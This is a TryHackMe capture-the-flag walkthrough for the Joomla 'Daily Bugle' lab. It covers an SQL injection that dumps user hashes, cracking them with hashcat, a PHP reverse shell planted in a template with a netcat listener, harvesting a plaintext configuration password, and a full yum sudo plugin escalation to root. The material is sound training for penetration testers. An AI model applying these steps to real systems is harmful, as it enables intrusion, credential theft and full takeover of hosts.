# Daily Bugle

#### https://tryhackme.com/room/dailybugle

The Daily Bugle is a Spiderman themed room made with Joomla.

## ENUMERATION 

I first start with an NMAP scan on the target, however, instead of using NMAP directly I installed a simple tool called Threader 3000 (https://github.com/dievus/threader3000) which is a multi-threader port scanner made in Python.
This tool does quite fast port discovery which after that offers you to do an NMAP scan on the discovered ports.

```
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.1.10
------------------------------------------------------------
Scanning target 10.10.1.10
Time started: 2021-01-05 19:31:12.438710
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port 3306 is open
Port scan completed in 0:00:23.890946
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80,3306 -sV -sC -T4 -Pn -oA 10.10.1.10 10.10.1.10
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
```

```
nmap -p22,80,3306 -sV -sC -T4 -Pn -oA 10.10.1.10 10.10.1.10
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 19:34 CET
Nmap scan report for 10.10.1.10
Host is up (0.066s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
------------------------------------------------------------
Combined scan completed in 0:03:42.703297
Press enter to quit...
```

As we can see there are 3 ports open
```
22 - SSH
80 - HTTP
3306 - MYSQL (MariaDB)
```

I can't much do on Port 22, however on port 80 we can see that webpage is created in Joomla.

## Joomla Exploitation

Once you open the webpage you will discover the answer to the first question in Task 1.
Joomla is a CMS (Content Management System) much like Wordpress, Wix etc...

Similar to **wpscan**, there is **joomscan**, which by default is installed on Kali Linux.

Fire up **joomscan -u http://<target-ip>** and let it do it's work.
After the scan we can see a few interesting things.
That there is an administrator login page and the version of Joomla that is running.

This will give you the answer to the first question of Task 2.

Searching online for exploits of the version we can find that it is vunreable to SQLi.

An interesting script pops up https://github.com/stefanlucas/Exploit-Joomla

Now after getting the script there will be some issue with it, mainly with python3, so in order for it to work, use python2 -m pip install requests and execute the script with python2.
```
[-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.**REDACTED**', '', '']
  -  Extracting sessions from fb9j5_session
```

With the script we get a few interesting findings, mainly the user **jonah** and a hashed password.

You can use **hash-identifier** to identify the hash (*by default it is installed on Kali Linux, if not just do sudo apt install hash-identifier*) or an online version at 

https://www.onlinehashcrack.com/hash-identification.php

Now we can either use **John** or **hashcat** to crack the password, and I will suggest you crack the hash on your local machine, or on a much more faster machine rather than the one that THM offers (AttackBox) since it will take some time to crack the hash.

I went with ```hashcat -m # -a 0 hash.txt -o cracked.txt wordlist/location``` and used *rockyou.txt* as the wordlist. You will also have to discover which mode to use (-m #) in order to crack the hash.

After cracking the password you will get the answer to the second question of Task 2.

Now with the credentials set, we can login to the Joomla admin panel and get our reverse shell.

Joomla is made with PHP which means we will *php-reverse-shell* to get our reverse shell. By default in Kali Linux, the script is located in **/usr/share/webshells/php/** or you can get it from https://github.com/pentestmonkey/php-reverse-shell

Remember to always set your IP and PORT in the script so that your listener can connect.

Now how do we get our script in the Joomla admin panel?

On the top go to `Extensions -> Templates -> Templates`  choose Beez3 and on the left simply paste the code in the *index.php* file.

Start netcat with `nc -lvnp PORT_NUMBER` and navigate to `http://<target-ip>/templates/beez3`

## PRIVILIGE ESCALATION

Once in, it is a good idea to stabilize your shell, so that you can use the arrow keys, tab completion and use Ctrl+C 

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
^Z (Ctrl+Z)
stty raw -echo;fg
```

After that it is a good idea to search around in */var/www/html* and see if you can find something interesting.

We can see that there is a *configuration.php* file

```sh
bash-4.2$ pwd
/var/www/html
bash-4.2$ ls -lahs
total 64K
4.0K drwxr-xr-x. 17 apache apache 4.0K Dec 14  2019 .
   0 drwxr-xr-x.  4 root   root     33 Dec 14  2019 ..
 20K -rwxr-xr-x.  1 apache apache  18K Apr 25  2017 LICENSE.txt
8.0K -rwxr-xr-x.  1 apache apache 4.4K Apr 25  2017 README.txt
   0 drwxr-xr-x. 11 apache apache  159 Apr 25  2017 administrator
   0 drwxr-xr-x.  2 apache apache   44 Apr 25  2017 bin
   0 drwxr-xr-x.  2 apache apache   24 Apr 25  2017 cache
   0 drwxr-xr-x.  2 apache apache  119 Apr 25  2017 cli
4.0K drwxr-xr-x. 19 apache apache 4.0K Apr 25  2017 components
4.0K -rw-r--r--   1 apache apache 2.0K Dec 14  2019 configuration.php
4.0K -rwxr-xr-x.  1 apache apache 3.0K Apr 25  2017 htaccess.txt
   0 drwxr-xr-x.  5 apache apache  164 Dec 15  2019 images
   0 drwxr-xr-x.  2 apache apache   64 Apr 25  2017 includes
4.0K -rwxr-xr-x.  1 apache apache 1.4K Apr 25  2017 index.php
   0 drwxr-xr-x.  4 apache apache   54 Apr 25  2017 language
   0 drwxr-xr-x.  5 apache apache   70 Apr 25  2017 layouts
   0 drwxr-xr-x. 11 apache apache  255 Apr 25  2017 libraries
4.0K drwxr-xr-x. 26 apache apache 4.0K Apr 25  2017 media
4.0K drwxr-xr-x. 27 apache apache 4.0K Apr 25  2017 modules
   0 drwxr-xr-x. 16 apache apache  250 Apr 25  2017 plugins
4.0K -rwxr-xr-x.  1 apache apache  836 Apr 25  2017 robots.txt
   0 drwxr-xr-x.  5 apache apache   68 Dec 15  2019 templates
   0 drwxr-xr-x.  2 apache apache   24 Dec 15  2019 tmp
4.0K -rwxr-xr-x.  1 apache apache 1.7K Apr 25  2017 web.config.txt
```

In the file you will find a password stored in plain text.

Also a good idea is to see if you can read the /etc/passwd file to see the current users on the machine.

Now with the users discovered we can try and see if we can access the SSH with the found user **j[REDACTED]**. We can see that we can login with the discovered user and password to the machine with SSH.

```sh
ssh USER@10.10.1.10
USER@10.10.1.10's password: 
Last login: Tue Jan  5 15:03:32 2021 from ip-10-9-166-168.eu-west-1.compute.internal
USER@dailybugle ~]$ pwd
/home/jjameson
USER@dailybugle ~]$ ls
user.txt
USER@dailybugle ~]$ cat user.txt
```

With this you get the *user.flag* and the answer to the third question in Task 2.

Now it's time for the final step, to escalate our privileges as root.

As always, use `id` to see to which groups you belong to find a way to exploit what privileges the groups offer.

You can see that the user does not belong to any interesting group. Next do `sudo -l` to check which programs you can run as sudo

```sh
User USER may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

We can see that we can use yum as sudo without requiring us to enter the users password.

This is excellent as you can find on GTFObins (https://gtfobins.github.io/) on how to get an interactive root shell with yum.

Simply follow the instructions (https://gtfobins.github.io/gtfobins/yum/)

```sh
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Once done you get root access to the machine and can read the */root/root.txt* flag which will also give you the answer to the fourth question in Task 2.

## FINAL THOUGHTS

This challenge was quite easy, the only difficult part was to discover the SSH credentials.
I hope you learned something new :)